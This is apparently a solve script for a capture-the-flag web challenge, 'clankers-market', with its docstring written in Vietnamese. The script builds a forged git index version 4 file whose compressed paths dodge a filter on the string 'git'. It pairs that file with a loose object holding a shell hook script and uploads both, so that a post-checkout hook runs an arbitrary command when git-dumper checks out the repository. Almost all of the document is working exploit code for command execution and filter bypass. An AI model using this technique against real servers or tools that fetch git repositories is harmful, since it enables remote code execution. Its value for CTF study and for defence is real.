#!/usr/bin/env python3
"""
B01lers CTF 2026 - clankers-market (web)
Exploit: ghi đè .git/index version 4 (path compression né được grep 'git'),
ghi loose object chứa hook script, để git-dumper tự `git checkout` và chạy
post-checkout hook đọc /flag.txt qua SUID helper /usr/local/bin/read-flag.

Usage:
    python3 solve.py http://CHALL_HOST:5000
    python3 solve.py http://127.0.0.1:5000 --command "/usr/local/bin/read-flag > /tmp/dump/flag.txt"
"""
import argparse, hashlib, random, re, struct, sys, zlib
import requests

DEFAULT_COMMAND = "/usr/local/bin/read-flag > /tmp/dump/flag.txt"


def git_blob(data):
    body = b"blob %d\x00" % len(data) + data
    return hashlib.sha1(body).hexdigest(), zlib.compress(body)


def encode_varint(value):
    if value == 0: return b"\x00"
    out = bytearray()
    while value > 0:
        byte = value & 0x7F; value >>= 7
        if value: byte |= 0x80
        out.append(byte)
    return bytes(out)


def compress_index_path(path, previous_path):
    common_len = 0
    for a, b in zip(path, previous_path):
        if a != b: break
        common_len += 1
    remove_len = len(previous_path) - common_len
    suffix = path[common_len:]
    return encode_varint(remove_len) + suffix + b"\x00"


def pack_index_entry(path, previous_path, sha_hex, size, mode):
    flags = len(path)
    sha_raw = bytes.fromhex(sha_hex)
    header = struct.pack(">LLLLLLLLLL20sH", 0,0,0,0,0,0, mode, 0,0, size, sha_raw, flags)
    return header + compress_index_path(path, previous_path)


def build_index_v4(sha_hex, payload_size):
    seed_path = b".giZ"
    hook_path = b".git/hooks/post-checkout"
    data = bytearray()
    data += b"DIRC"
    data += struct.pack(">LL", 4, 2)   # version 4, 2 entries
    data += pack_index_entry(seed_path, b"", sha_hex, payload_size, 0o100755)
    data += pack_index_entry(hook_path, seed_path, sha_hex, payload_size, 0o100755)
    return bytes(data)


def build_payload(command):
    for nonce in range(0x10000):
        script = f"#!/bin/sh\n{command}\n# {nonce}\n".encode()
        sha_hex, loose_object = git_blob(script)
        index_data = build_index_v4(sha_hex, len(script))
        if b"git" in loose_object or b"git" in index_data:
            continue
        return index_data, sha_hex, loose_object
    raise RuntimeError("no sanitize-safe payload found")


def register(session, base_url):
    while True:
        u = f"user_{random.randrange(1<<48):012x}"
        p = f"pw_{random.randrange(1<<48):012x}"
        r = session.post(f"{base_url}/register", data={"username": u, "password": p}, timeout=20)
        if "Username already exists." in r.text: continue
        if r.status_code != 200: raise RuntimeError(f"register HTTP {r.status_code}")
        return u


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base_url")
    ap.add_argument("--command", default=DEFAULT_COMMAND)
    args = ap.parse_args()
    base_url = args.base_url.rstrip("/")
    if "://" not in base_url: base_url = "http://" + base_url

    s = requests.Session()
    register(s, base_url)
    index_data, sha_hex, loose_object = build_payload(args.command)
    files = [
        ("file", (".git/index", index_data, "application/octet-stream")),
        ("file", (f".git/objects/{sha_hex[:2]}/{sha_hex[2:]}", loose_object, "application/octet-stream")),
    ]
    r = s.post(f"{base_url}/clanker-feature", files=files, timeout=60)
    m = re.search(r"Congrats:\s*([^<\r\n]+)", r.text)
    if m:
        print(f"FLAG: {m.group(1).strip()}")
        return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
